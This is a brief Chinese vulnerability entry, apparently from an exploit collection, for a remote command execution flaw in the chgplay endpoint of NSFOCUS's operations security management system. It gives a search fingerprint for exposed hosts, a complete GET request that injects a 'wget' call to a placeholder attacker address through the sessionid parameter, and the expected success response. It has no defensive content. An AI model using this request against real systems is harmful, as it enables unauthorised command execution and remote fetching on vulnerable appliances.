# 绿盟运维安全管理系统chgplay存在远程命令执行漏洞

绿盟运维安全管理系统 ｜ 命令执行 ｜ —
- **指纹**：`body="'/needUsbkey.php?username='"`
- **请求**：`GET /webconf/log/chgplay?cat=espc&sid=7473a85e535405e7bd991cb82b2f134c&status=charset&speed=10&sessionid=;wget%20http://IP:59693/11111; HTTP/1.1`
- **响应特征**：200